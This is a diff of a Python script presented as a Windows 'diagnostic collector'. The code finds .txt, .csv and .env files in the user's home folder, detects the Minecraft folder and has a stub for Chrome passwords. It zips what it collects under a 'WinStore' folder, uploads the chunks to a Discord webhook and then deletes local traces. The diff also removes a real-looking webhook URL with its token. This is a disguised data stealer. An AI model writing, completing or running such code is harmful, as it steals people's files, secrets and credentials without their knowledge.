@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
+!!!!-ONLY WORKS WITH WINDOWS MACHINES-!!!!
+
 Optimized Diagnostic Collector (Refactored)
 this script collect informations about the system to help diagnose issues, 
 and uploads the data to a Discord webhook in chunks. 
-Then rebuild the informattions back into a whole using another script.
+Then rebuild the informations back into a whole using another script.
 """
 
 from __future__ import annotations
@@ -32,22 +34,21 @@ except Exception:
     requests = None
 
 # ---------------- CONFIG ----------------
-WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1444045456681210018/W45xarf7B-ao5zlDlTE4XQWBVEu7RjxEguqhLAvRIz0l4Hgi8oZNax4a3CHEPyAnXVzm"  # preserved feature flag, intentionally inert
-CLEANUP_AFTER_SEND = True
-VERBOSE = True
+WEBHOOK_URL = ""  # ⪻insert discord webhook url
+CLEANUP_AFTER_SEND = True # ⪻if clean leftover data after send
+VERBOSE = True # ⪻if show log in terminal when run
 
 BASE_OUTPUT = Path(os.getenv("PROGRAMDATA") or Path.home()) / "WinStore"
 RUN_PREFIX = "run_"
 
-ZIP_NAME_TEMPLATE = "diagnostics_{ts}.zip"
-JSON_NAME_TEMPLATE = "system_info_{ts}.json"
-MANIFEST_NAME = "manifest.json"
+ZIP_NAME_TEMPLATE = "diagnostics_{ts}.zip" # ⪻file name template for whole older containing everything
+JSON_NAME_TEMPLATE = "system_info_{ts}.json" # ⪻file name template for diagnostic info
+MANIFEST_NAME = "manifest.json" # ⪻name for index file for rebuild.py to rebuild data chunks
 
-DISCORD_SAFE_CHUNK = 7 * 1024 * 1024
-UPLOAD_DELAY = 1
-# ---------------------------------------
+DISCORD_SAFE_CHUNK = 7 * 1024 * 1024 # ⪻how much data send per time to discord (maximum 8mb at a time)
+UPLOAD_DELAY = 1 # ⪻uploading delay beteween each chunk
 
-# ---------------- UTILS ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ UTILS ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def log(msg: str) -> None:
     if VERBOSE:
         print(msg)
@@ -68,10 +69,8 @@ def safe_scale(num: float) -> str:
             return f"{n:.2f}{unit}"
         n /= 1024
     return f"{n:.2f}PB"
-# --------------------------------------
 
-
-# ---------------- COLLECTORS ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ COLLECTORS ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def collect_system_info() -> Dict[str, Any]:
     # Old: {"timestamp": datetime.utcnow().isoformat()}
     info: Dict[str, Any] = {"timestamp": datetime.now(timezone.utc).isoformat()}
@@ -168,10 +167,8 @@ def detect_minecraft_folder() -> Dict[str, Optional[str]]:
 
 def collect_chrome_passwords() -> List[Dict[str, str]]:
     return []  # preserved feature surface, optimized stub
-# --------------------------------------
 
-
-# ---------------- FILE COLLECTION ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ FILE COLLECTION ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def find_target_files() -> List[Path]:
     home = Path.home()
     exts = {".txt", ".csv", ".env"}
@@ -182,10 +179,8 @@ def find_target_files() -> List[Path]:
             if p.suffix.lower() in exts:
                 results.append(p)
     return results
-# --------------------------------------
 
-
-# ---------------- ZIP / CHUNK ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ ZIP / CHUNK ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def create_compressed_zip(files: List[Path], zip_path: Path) -> Path:
     with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_LZMA) as zf:
         for f in files:
@@ -219,10 +214,8 @@ def create_manifest(chunks: List[Path], zip_name: str, path: Path) -> None:
         "created": datetime.now(timezone.utc).isoformat(),
     }
     path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
-# --------------------------------------
 
-
-# ---------------- UPLOAD ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ UPLOAD ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def upload_chunks_to_discord(_: List[Path], __: Optional[Path] = None) -> bool:
     # Uploads each chunk to the Discord webhook as a file attachment
     if not WEBHOOK_URL or not requests:
@@ -262,10 +255,8 @@ def upload_chunks_to_discord(_: List[Path], __: Optional[Path] = None) -> bool:
             log(f"[ERROR] Exception uploading manifest: {e}")
             success = False
     return success
-# --------------------------------------
 
-
-# ---------------- CLEANUP ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ CLEANUP ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def safe_remove_path(path: Path) -> None:
     try:
         if path.is_file():
@@ -274,10 +265,8 @@ def safe_remove_path(path: Path) -> None:
             shutil.rmtree(path)
     except Exception:
         pass
-# --------------------------------------
 
-
-# ---------------- MAIN ----------------
+# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ MAIN ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
 def run_collection_and_upload() -> None:
 
     ts = now_ts()
